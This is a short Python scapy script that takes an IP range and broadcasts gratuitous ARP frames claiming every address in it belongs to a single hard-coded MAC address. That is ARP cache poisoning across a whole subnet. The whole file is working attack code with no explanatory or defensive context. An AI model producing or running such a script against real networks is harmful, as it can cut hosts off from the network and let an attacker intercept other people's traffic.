import logging
import ipaddress

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

ip_range = input('Enter IP [ip/netmask] ; ')
for addr in ipaddress.ip_network(ip_range):
    L2=Ether(dst="FF:FF:FF:FF:FF:FF",src="B8:AC:6F:0C:BA:B9",type=0x806)
    GARP=ARP(pdst=str(addr),psrc=str(addr), op=1 , hwsrc="B8:AC:6F:0C:BA:B9")
    sendp(L2/GARP)
